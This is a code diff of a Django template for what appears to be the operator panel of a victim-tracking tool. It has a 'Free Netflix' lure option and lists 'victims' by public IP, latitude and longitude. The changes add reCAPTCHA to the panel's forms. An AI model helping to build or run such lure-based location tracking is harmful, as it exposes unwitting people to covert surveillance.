@@ -76,8 +76,10 @@
                 <option class="dropdown-item" value="1">Free Netflix</option>
               </div></select>
             </div>
+            <input type="hidden" name="g-recaptcha-response" id="g-recaptcha-token" value="" />
+            <button id="recaptcha" class="g-recaptcha" data-sitekey="6LdcXqUZAAAAAP7lK_k0muU99TX9UTnXZJh-VmVw" data-callback='onSubmit' hidden>Submit</button>
             <br>
-            <input class="btn btn-primary btn-lg" id="searchsubmit" value="Start Tracking" type="submit"></input>
+            <input class="btn btn-primary btn-lg" id="searchsubmit" value="Start Tracking" onclick="javascript:document.getElementById('recaptcha').click();" type="submit"></input>
           </form>
         </div>
       </div>
@@ -145,14 +147,16 @@ function refresh(){
 
       {% load extras %}
 
-      <form name="searchform" method="POST" action="/" > {% csrf_token %}
+      <form id="searchform" name="searchform" method="POST" action="/" > {% csrf_token %}
        
         {% define victims.0 as publicip %}
         {% defines victims.3 as latitude %}
         {% defines victims.4 as longitude %}
-         
+        
         <input hidden name="query" id="query" value="{{publicip|add:latitude|add:longitude}}"> 
-      <td><button type="submit" value="query" class="btn btn-primary btn-sm">Execute</button></td>
+        <input type="hidden" name="g-recaptcha-response" id="g-recaptcha-token" value="" />
+        <button id="recaptcha" class="g-recaptcha" data-sitekey="6LdcXqUZAAAAAP7lK_k0muU99TX9UTnXZJh-VmVw" data-callback='onSubmit' hidden>Submit</button>
+      <td><button type="button" onclick="javascript:document.getElementById('recaptcha').click();" value="query" class="btn btn-primary btn-sm">Execute</button></td>
       </form>
       </tr>
     {% endfor %}
@@ -161,6 +165,15 @@ function refresh(){
 </div>
 <br>
 <br>
+<script>
+    function onSubmit(token) {
+      if("{{victims.0}}" != ""){
+      document.getElementById("g-recaptcha-token").value=token;
+      document.getElementById("searchform").submit();
+      }alert()
+    }
+  </script>
+<script src="https://www.google.com/recaptcha/api.js?render=6LdcXqUZAAAAAP7lK_k0muU99TX9UTnXZJh-VmVw"></script>
 
 
 <br><br>
@@ -170,6 +183,7 @@ function refresh(){
             if (result == true) { 
                 document.getElementById("flush").value = "Confirm";
                 document.getElementById("flushdb").submit();
+                document.getElementById('recaptcha').click()
             }
         } 
   </script>
